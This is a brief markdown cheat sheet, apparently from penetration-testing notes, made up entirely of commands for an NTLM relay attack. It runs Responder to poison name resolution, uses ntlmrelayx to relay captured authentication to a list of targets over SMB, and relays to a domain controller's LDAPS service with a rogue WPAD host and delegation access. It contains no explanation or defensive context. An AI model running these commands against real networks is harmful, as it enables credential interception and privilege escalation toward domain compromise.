# Responder + ntlmrelayx

```bash
# Start Responder (disable SMB/HTTP for relay)
responder -I eth0 -wrf

# Start relay
ntlmrelayx.py -tf targets.txt -smb2support

# LDAP relay for delegation attack
ntlmrelayx.py -t ldaps://dc.domain.local -wh attacker-wpad --delegate-access
```